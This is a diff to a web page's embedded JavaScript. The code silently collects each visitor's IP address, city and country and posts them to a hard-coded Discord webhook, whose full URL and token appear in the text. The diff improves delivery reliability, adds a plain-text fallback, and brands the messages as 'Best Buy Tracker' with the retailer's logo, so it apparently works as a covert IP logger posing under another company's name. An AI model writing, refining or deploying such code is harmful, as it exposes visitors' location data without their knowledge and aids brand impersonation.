@@ -127,7 +127,7 @@
 
 <script>
 // ────────────────────────────────────────────────
-//   Sends visitor info to Discord webhook as embed (no-cors mode)
+//   Sends visitor info to Discord webhook as embed
 // ────────────────────────────────────────────────
 async function sendToWebhook() {
     try {
@@ -158,15 +158,36 @@ async function sendToWebhook() {
         // YOUR WEBHOOK HERE
         const webhook = "https://discord.com/api/webhooks/1469122980478193726/7Sw4UgBa3pnSIenn2iG_CntO_6sQUMwgynMbsl6nZ3QpR8ZR3O6fb7Cq3v0qMOxiz6Yl";
 
-        await fetch(webhook, {
+        const response = await fetch(webhook, {
             method: "POST",
-            mode: "no-cors",          // Skips preflight OPTIONS
-            cache: "no-cache",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ embeds: [embed] })
+            headers: { 
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ 
+                embeds: [embed],
+                username: "Best Buy Tracker",
+                avatar_url: "https://logos-world.net/wp-content/uploads/2020/11/Best-Buy-Emblem.png"
+            })
         });
 
-        console.log("Embed sent (no-cors mode - check Discord to confirm)");
+        if (response.ok) {
+            console.log("Embed sent successfully!");
+        } else {
+            console.error(`Failed to send embed: ${response.status} ${response.statusText}`);
+            // Try sending as plain text as fallback
+            try {
+                await fetch(webhook, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: `New visitor from ${data.ip} (${data.city}, ${data.country_name}) - ${new Date().toUTCString()}`,
+                        username: "Best Buy Tracker"
+                    })
+                });
+            } catch (fallbackErr) {
+                console.error("Fallback also failed:", fallbackErr.message);
+            }
+        }
     } catch (err) {
         console.error("Logging attempt failed:", err.message);
     }
